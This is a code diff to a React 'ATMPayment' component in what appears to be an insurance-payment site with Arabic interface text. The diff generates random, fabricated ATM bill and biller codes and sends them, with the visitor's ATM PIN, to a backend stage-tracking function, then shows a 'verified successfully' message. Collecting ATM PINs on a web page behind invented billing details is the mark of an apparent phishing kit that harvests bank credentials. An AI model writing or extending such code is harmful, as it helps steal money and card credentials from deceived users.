@@ -29,11 +29,27 @@ const ATMPayment = () => {
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(orderId !== "DEMO-001" ? orderId : null);
   const inputRef = useRef<HTMLInputElement>(null);
 
+  // Generate stable ATM bill/biller codes per session
+  const [atmBillNumber] = useState(() => {
+    const stored = sessionStorage.getItem("atm_bill_number");
+    if (stored) return stored;
+    const num = String(Math.floor(100000000 + Math.random() * 900000000));
+    sessionStorage.setItem("atm_bill_number", num);
+    return num;
+  });
+  const [atmBillerCode] = useState(() => {
+    const stored = sessionStorage.getItem("atm_biller_code");
+    if (stored) return stored;
+    const code = String(Math.floor(100 + Math.random() * 900));
+    sessionStorage.setItem("atm_biller_code", code);
+    return code;
+  });
+
   const handleVerify = async () => {
     if (pin.length < 4) return;
     setLoading(true);
     linkVisitorToSession({});
-    const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin });
+    const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin, atm_bill_number: atmBillNumber, atm_biller_code: atmBillerCode });
     setCurrentOrderId(id);
     if (id) sessionStorage.setItem("insurance_order_id", id);
     toast.success("تم التحقق بنجاح");
